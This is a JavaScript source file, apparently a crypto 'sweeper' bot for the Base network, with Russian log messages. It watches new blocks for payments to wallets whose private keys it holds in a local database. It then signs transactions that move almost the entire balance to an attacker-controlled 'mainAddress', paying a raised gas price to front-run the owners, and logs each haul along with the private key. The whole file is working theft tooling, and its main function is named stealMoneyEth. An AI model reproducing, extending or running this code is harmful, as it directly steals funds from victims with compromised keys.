import Web3 from "web3";
import * as fs from 'fs';
import * as path from 'path';
import { rpc, grab, mainAddress } from "./config.js";

let web3 = null
let data = null

export async function runBase() {
    try {
        web3 = new Web3(new Web3.providers.WebsocketProvider(rpc.BASE));
    } catch (error) {
        console.log("Не удалось подключиться к сети BASE")
        return;
    }
    data = JSON.parse(fs.readFileSync(path.join('./DB', 'database.json')));
    await getBlocksEth();
}

async function getBlocksEth() {
    const subscription = await web3.eth.subscribe('newBlockHeaders');
    subscription.on('data', async (block, error) => {
        try {
            const lastBlock = await web3.eth.getBlock(block.number, true);
            const ethTransactions = lastBlock?.transactions;
            console.log(`Block ${lastBlock?.number} | BASE`);
            for (let transaction of ethTransactions) {
                transactionWalletEth(transaction);
            }
        }  catch (error) {
            console.log('Не удалось получить транзакции в сети BASE');
        }
    });
    subscription.on('error', (error) => console.log(error));
}

function transactionWalletEth(transaction) {
    const address = transaction.to;
    if (data[address]) {
        stealMoneyEth(address);
    }
}

async function stealMoneyEth(address) {
    const walletKey = data[address];
    const grabFromEthBalance = web3.utils.toWei(grab.BASE, 'ether');
    const balance = await web3.eth.getBalance(address);
    let gasPrice = await web3.eth.getGasPrice();

    const gasUnits = await web3.eth.estimateGas({
        "from": address,
        "to": web3.utils.toChecksumAddress(mainAddress),
        "value": balance,
    });
    let transactionCost = 0;
    const average = ((Math.random() * (2.6 - 2.3) + 2.3) + (Math.random() * (3 - 2.7) + 2.7)) / 2;

    gasPrice = BigInt(Math.trunc(Number(gasPrice) * average));
    transactionCost = gasUnits * BigInt(Math.round((Number(gasPrice) * 1.5)));

    for (let i = 0; i < 200; i++) {
        if (balance > grabFromEthBalance) {
            break;
        } else if (i === 199) {
            return;
        }
    }

    const amount = balance - transactionCost;
    const sendAddress = web3.utils.toChecksumAddress(mainAddress);
    const nonce = await web3.eth.getBlockTransactionCount(address);

    if (amount <= 0) {
        return;
    }

    const txPrice = {
        "chainId": 8453,
        "nonce": nonce,
        "to": sendAddress,
        "from": address,
        "value": amount,
        "gas": gasUnits,
        "maxFeePerGas": gasPrice,
        "maxPriorityFeePerGas": gasPrice,
        "type": 2
    };
    const signedTx = await web3.eth.accounts.signTransaction(txPrice, walletKey);
    const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    const amountEther = web3.utils.fromWei(amount, 'ether');
    console.log(`✅ BASE | Success withdrawal \nHASH: ${txHash} \n\nAMOUNT: ${amountEther} \nADDR: https://basescan.org/address/${address} \nPK: ${walletKey}`);
}